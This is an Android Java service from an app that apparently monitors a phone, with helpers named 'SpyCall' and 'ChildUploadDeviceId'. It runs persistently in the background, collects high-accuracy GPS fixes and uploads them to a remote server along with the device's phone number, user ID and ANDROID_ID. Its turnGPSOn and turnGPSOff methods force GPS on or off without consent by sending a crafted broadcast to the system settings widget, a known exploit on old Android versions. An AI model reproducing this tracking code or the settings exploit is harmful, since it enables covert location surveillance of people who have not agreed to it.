package com.hinj.secure.smsgps;

import java.util.Timer;
import java.util.TimerTask;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationListener;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.provider.Settings.Secure;
import android.util.Log;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GooglePlayServicesClient;
import com.google.android.gms.common.GooglePlayServicesUtil;
import com.google.android.gms.location.LocationClient;
import com.google.android.gms.location.LocationRequest;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.app.utils.SpyCallSharedPrefrence;
import com.hinj.app.utils.Utility;


public class CallGPSService extends Service implements LocationListener,
GooglePlayServicesClient.ConnectionCallbacks,
GooglePlayServicesClient.OnConnectionFailedListener,com.google.android.gms.location.LocationListener{
	
	private static final String TAG = "GpsLogService";
	RequestPost RequestPostClass;
	 // A request to connect to Location Services
    private LocationRequest mLocationRequest;

    // Stores the current instantiation of the location client in this object
    private LocationClient mLocationClient;
    
    // Handle to SharedPreferences for this app
    SharedPreferences mPrefs;

    // Handle to a SharedPreferences editor
    SharedPreferences.Editor mEditor;
    Handler handler;
    /*
     * Note if updates have been turned on. Starts out as "false"; is set to "true" in the
     * method handleRequestSuccess of LocationUpdateReceiver.
     *
     */
    boolean mUpdatesRequested = false;
    static int gpsflag=0;
    TimerTask Task;
	Timer LogActivityTimer;
	Location currentLocation;
	Context mContext;
	
	double latitude;
	double longitude;
	
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		handler=new Handler();
		
		 //**************
        mLocationRequest = LocationRequest.create();
        /*
         * Set the update interval
         */
        mLocationRequest.setInterval(LocationUtils.UPDATE_INTERVAL_IN_MILLISECONDS);

        // Use high accuracy
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);

        // Set the interval ceiling to one minute
        mLocationRequest.setFastestInterval(LocationUtils.FAST_INTERVAL_CEILING_IN_MILLISECONDS);

        // Note that location updates are off until the user turns them on
        mUpdatesRequested = false;

        // Open Shared Preferences
        mPrefs = getSharedPreferences(LocationUtils.SHARED_PREFERENCES, Context.MODE_PRIVATE);

        // Get an editor
        mEditor = mPrefs.edit();
		/*
         * Create a new location client, using the enclosing class to
         * handle callbacks.
         */
		mLocationClient = new LocationClient(this, this, this);
		 //OnStart 
        mLocationClient.connect();

	}
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		   // Create a new global location parameters object
		
		Task = new TimerTask() {
			public void run() {
				handler.post(new Runnable() {
					@Override
					public void run() {
						if (true) {
							try {
							if (servicesConnected()) {
								startPeriodicUpdates();		
								
								  currentLocation = mLocationClient.getLastLocation();
						          // Display the current location in the UI
									
						          if (currentLocation != null) { 
						        	  
						        	  if(Utility.isNetworkAvailable(CallGPSService.this)){
										//****Stop Monitoring On/Off
						        		  new GPSTrackTasknew().execute();

									}else{
										Log.i(TAG, "NO INTERNET OR GPS IS OFF    ");
									}						        	
						          } else {
						          }
								 }else{
									 Log.d(LocationUtils.APPTAG, "Google Play services is available");
								 }
								  
							} catch (Exception e) {
								// TODO: handle exception
								e.printStackTrace();
							}
						}
					}
				});
			}
		};
		LogActivityTimer = new Timer();
		/*int getTime=Integer.parseInt(CellPoliceSharedPreferences.getGPSInterval(GPSService.this));
		LogActivityTimer.scheduleAtFixedRate(Task, 1000,getTime*1000 * 60  );*/
		LogActivityTimer.schedule(Task, 1);
		return START_STICKY;
	}
	@Override
	public void onLocationChanged(Location location) {
		latitude = location.getLatitude();
		longitude = location.getLongitude();
		
	}

	@Override
	public void onProviderDisabled(String provider) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onProviderEnabled(String provider) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	//**************************************
	
	 /**
     * Verify that Google Play services is available before making a request.
     *
     * @return true if Google Play services is available, otherwise false
     */
    private boolean servicesConnected() {

        // Check that Google Play services is available
        int resultCode =GooglePlayServicesUtil.isGooglePlayServicesAvailable(this);

        // If Google Play services is available
        if (ConnectionResult.SUCCESS == resultCode) {
            // In debug mode, log the status
            Log.d(LocationUtils.APPTAG, "Google Play services is available");
            // Continue
            return true;
        // Google Play services was not available for some reason
        } else {
           
            return false;
        }
    }
	/* (non-Javadoc)
	 * @see com.google.android.gms.common.GooglePlayServicesClient.OnConnectionFailedListener#onConnectionFailed(com.google.android.gms.common.ConnectionResult)
	 */
	@Override
	public void onConnectionFailed(ConnectionResult arg0) {
		// TODO Auto-generated method stub
		
	}
	/* (non-Javadoc)
	 * @see com.google.android.gms.common.GooglePlayServicesClient.ConnectionCallbacks#onConnected(android.os.Bundle)
	 */
	@Override
	public void onConnected(Bundle arg0) {
		// TODO Auto-generated method stub
		
	}
	/* (non-Javadoc)
	 * @see com.google.android.gms.common.GooglePlayServicesClient.ConnectionCallbacks#onDisconnected()
	 */
	@Override
	public void onDisconnected() {
		// TODO Auto-generated method stub
		
	}
	
  
  class GPSTrackTasknew extends AsyncTask<Double, Void, Void> {

		@Override
		protected void onPreExecute() {
			//show your dialog here
			//progressDialog = ProgressDialog.show(CallActivity.this,"Please wait...", "Loading  ...", true);
		}

		@Override
		protected Void doInBackground(Double... params) {        
			//make your request here - it will run in a different thread
			try
			{
				latitude=currentLocation.getLatitude();
				longitude=currentLocation.getLongitude();
				stopPeriodicUpdates();////////////
				String getDeviceIDString=SpyCallSharedPrefrence.getsaveDEVICEID_Pre(CallGPSService.this);				
				String android_id = Secure.getString(CallGPSService.this.getContentResolver(),Secure.ANDROID_ID);
				String deviceId = HinjAppPreferenceUtils.getChildUploadDeviceId(CallGPSService.this);
				String getUserID_SP = HinjAppPreferenceUtils.getRaId(CallGPSService.this);
				RequestPostClass=new RequestPost();
				
				String getResponceLatLong=RequestPostClass.postLatLongPost(latitude,longitude,getUserID_SP,
						SpyCallSharedPrefrence.getsaveMOBILE_NO(CallGPSService.this),android_id);
				final JSONObject responseObject = new JSONObject(getResponceLatLong);
				final JSONArray responseArray = responseObject.getJSONArray("gps");
				if (responseArray.getJSONObject(0).toString()
						.contains("success")) {
				}
				Log.i(TAG, getResponceLatLong);
			}
			catch (Exception e) 
			{
				e.printStackTrace();
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			
			// progressDialog.dismiss();	
			//Log.i(TAG, "success");
			// getImagesDetail();
			//Toast.makeText(getApplicationContext(),"getResponceLatLong   "+getResponceLatLong , Toast.LENGTH_SHORT).show();		
			//Toast.makeText(mContext, LocationUtils.getLatLng(GPSService.this, currentLocation), Toast.LENGTH_LONG).show() ;
		}
	}
  

	/****************GPS Enable and Disable************************/

	public void turnGPSOn()
	{
	    Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
	    intent.putExtra("enabled", true);
	    sendBroadcast(intent);
	    Log.i("GPS********  ", "GPS    enabled");
	   
	  /*  try{
	    Settings.Secure.setLocationProviderEnabled(getContentResolver(), LocationManager.GPS_PROVIDER, true);
	    }catch (Exception e) {
			// TODO: handle exception
	    	e.printStackTrace();
		}*/
	    String provider = Settings.Secure.getString(getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
	    if(!provider.contains("gps")){ //if gps is disabled
	        final Intent poke = new Intent();
	        poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider"); 
	        poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
	        poke.setData(Uri.parse("3")); 
	        sendBroadcast(poke);
	    }
	}
	// automatic turn off the gps
	public void turnGPSOff()
	{
	   
	    Log.i("GPS********  ", "GPS    disabled");
	   /* try{
	    Settings.Secure.setLocationProviderEnabled(getContentResolver(), LocationManager.GPS_PROVIDER, false);
	    }catch (Exception e) {
			// TODO: handle exception
	    	e.printStackTrace();
		}*/
	    
	     String provider = Settings.Secure.getString(getContentResolver(), Settings.Secure.LOCATION_PROVIDERS_ALLOWED);
	    if(provider.contains("gps")){ //if gps is enabled 
	        final Intent poke = new Intent();
	        poke.setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
	        poke.addCategory(Intent.CATEGORY_ALTERNATIVE);
	        poke.setData(Uri.parse("3")); 
	        sendBroadcast(poke);
	    }
	}
	

    private void startPeriodicUpdates() {

        mLocationClient.requestLocationUpdates(mLocationRequest, this);
       // mConnectionState.setText(R.string.location_requested);
    }

    /**
     * In response to a request to stop updates, send a request to
     * Location Services
     */
    private void stopPeriodicUpdates() {
        mLocationClient.removeLocationUpdates(this);
        //mConnectionState.setText(R.string.location_updates_stopped);
    }
    
}
